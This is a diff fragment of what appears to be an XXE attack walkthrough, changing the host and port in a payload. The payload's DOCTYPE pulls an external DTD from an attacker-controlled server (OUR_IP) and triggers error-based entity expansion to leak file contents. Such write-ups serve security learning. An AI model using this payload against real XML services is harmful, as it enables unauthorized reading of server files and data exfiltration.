@@ -9,7 +9,7 @@ Open up a web server using Python to host the file, then call our DTD script as 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE email [ 
-  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  <!ENTITY % remote SYSTEM "http://OUR_IP:OUR_PORT/xxe.dtd">
   %remote;
   %error;
 ]>
